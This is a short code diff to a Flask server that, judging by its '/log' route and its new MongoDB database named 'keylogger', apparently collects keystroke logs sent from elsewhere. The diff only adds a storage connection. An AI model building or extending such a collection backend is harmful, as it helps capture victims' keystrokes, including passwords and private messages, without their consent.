@@ -1,6 +1,8 @@
 from flask import Flask, request, jsonify
 import sqlite3
 import datetime
+from pymongo import MongoClient
+
 
 app = Flask(__name__)
 
@@ -23,6 +25,10 @@ def save_log_to_db(log_data):
         print(f"Error saving log to database: {e}")
     finally:
         conn.close()
+
+client = MongoClient("mongodb://localhost:27017/")
+db = client.keylogger
+logs_collection = db.logs
 
 @app.route('/log', methods=['POST'])
 def log_key():
